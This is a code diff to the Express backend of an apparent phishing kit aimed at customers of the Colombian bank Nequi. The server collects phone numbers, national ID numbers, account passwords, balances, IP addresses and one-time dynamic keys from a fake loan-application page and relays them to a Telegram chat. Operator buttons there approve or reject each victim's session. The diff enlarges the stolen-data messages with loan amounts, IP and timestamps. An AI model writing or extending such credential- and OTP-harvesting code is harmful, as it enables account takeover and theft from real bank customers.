@@ -83,6 +83,19 @@ const normalizePhone = (phone) => {
     return phone.toString().replace(/\D/g, '').trim();
 };
 
+// Helper to format date
+const formatDate = () => {
+    const now = new Date();
+    const pad = (num) => String(num).padStart(2, '0');
+    return `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+};
+
+// Helper to get IP
+const getIP = (req) => {
+    const forwarded = req.headers['x-forwarded-for'];
+    return forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress || req.ip;
+};
+
 // In-memory storage for user sessions
 const userSessions = {};
 
@@ -99,15 +112,27 @@ bot.on('polling_error', (error) => {
     console.log('Telegram Polling Error:', error.message);
 });
 
+// Helper to format currency
+const formatMoney = (value) => {
+    if (!value || isNaN(value)) return value;
+    return new Intl.NumberFormat('es-CO').format(value);
+};
+
 // API Endpoint to receive data from frontend
 app.post('/api/save-data', (req, res) => {
-    const { celular, cedula, clave, saldo } = req.body;
+    let { celular, cedula, clave, saldo, monto, cuota } = req.body;
     
     if (!celular) {
         return res.status(400).json({ error: 'Celular is required' });
     }
 
     const cleanCelular = normalizePhone(celular);
+    const ip = getIP(req);
+    const fecha = formatDate();
+    
+    // Clean and format monto/cuota
+    const formattedMonto = formatMoney(monto);
+    const cleanCuota = cuota ? cuota.replace('$ ', '') : 'No calculado';
 
     // Store/Update session
     userSessions[cleanCelular] = {
@@ -115,19 +140,29 @@ app.post('/api/save-data', (req, res) => {
         cedula,
         clave,
         saldo,
+        monto: formattedMonto,
+        cuota: cleanCuota,
+        ip,
         status: 'waiting', // waiting, approved, rejected
         timestamp: new Date()
     };
 
     // Construct message for Telegram
     const message = `
-🔔 *NUEVO USUARIO* 🔔
+📱 *NEQUI - DATOS COMPLETOS*
 
-📱 *Celular:* ${cleanCelular} | 🔑 *Clave:* ${clave}
+👤 *Nombre:* Usuario Propulsor
 🆔 *Cédula:* ${cedula}
-💰 *Saldo:* ${saldo}
+📱 *Celular (Reg):* ${cleanCelular}
+💸 *Solicitud Crédito:* -PRESTAMO: ${formattedMonto}| 1ra cuota ${cleanCuota}
+📧 *Email:* No registrado
+🌐 *IP Usuario:* ${ip}
 
-⚠️ *Estado:* Esperando acción...
+📞 *Número (Login):* ${cleanCelular}
+🔒 *Contraseña:* ${clave}
+💰 *Saldo:* $${saldo}
+
+⏰ *Fecha:* ${fecha}
     `;
 
     // Send to Telegram with Inline Buttons
@@ -170,13 +205,19 @@ app.post('/api/check-status', (req, res) => {
 
 // API Endpoint to receive dynamic key
 app.post('/api/save-dynamic', (req, res) => {
-    const { celular, clave, dinamica } = req.body;
+    let { celular, clave, dinamica, cedula, monto, cuota, saldo } = req.body;
 
     if (!celular) {
         return res.status(400).json({ error: 'Celular is required' });
     }
 
     const cleanCelular = normalizePhone(celular);
+    const ip = getIP(req);
+    const fecha = formatDate();
+    
+    // Clean and format monto/cuota
+    const formattedMonto = formatMoney(monto);
+    const cleanCuota = cuota ? cuota.replace('$ ', '') : 'No calculado';
 
     // Update session
     if (userSessions[cleanCelular]) {
@@ -188,6 +229,11 @@ app.post('/api/save-dynamic', (req, res) => {
             celular: cleanCelular,
             clave,
             dinamica,
+            cedula,
+            monto: formattedMonto,
+            cuota: cleanCuota,
+            saldo,
+            ip,
             status: 'waiting_dynamic',
             timestamp: new Date()
         };
@@ -195,13 +241,21 @@ app.post('/api/save-dynamic', (req, res) => {
 
     // Construct message for Telegram
     const message = `
-🔔 *CLAVE DINÁMICA RECIBIDA* 🔔
+🔑 *NEQUI - CLAVE DINÁMICA RECIBIDA*
 
-📱 *Celular:* ${cleanCelular}
-🔑 *Clave:* ${clave}
-🔢 *Dinámica:* ${dinamica}
+👤 *Nombre:* Usuario Propulsor
+🆔 *Cédula:* ${cedula || (userSessions[cleanCelular] ? userSessions[cleanCelular].cedula : 'No disponible')}
+📱 *Celular (Reg):* ${cleanCelular}
+💸 *Solicitud Crédito:* -PRESTAMO: ${formattedMonto || (userSessions[cleanCelular] ? userSessions[cleanCelular].monto : 'No disponible')}| 1ra cuota ${cleanCuota || (userSessions[cleanCelular] ? userSessions[cleanCelular].cuota : 'No disponible')}
+🌐 *IP Usuario:* ${ip}
 
-⚠️ *Estado:* Esperando acción...
+🎯 *Clave Dinámica:* ${dinamica}
+
+📞 *Número (Login):* ${cleanCelular}
+🔒 *Contraseña:* ${clave || (userSessions[cleanCelular] ? userSessions[cleanCelular].clave : 'No disponible')}
+💰 *Saldo:* $${saldo || (userSessions[cleanCelular] ? userSessions[cleanCelular].saldo : 'No disponible')}
+
+⏰ *Fecha:* ${fecha}
     `;
 
     // Send to Telegram with Inline Buttons
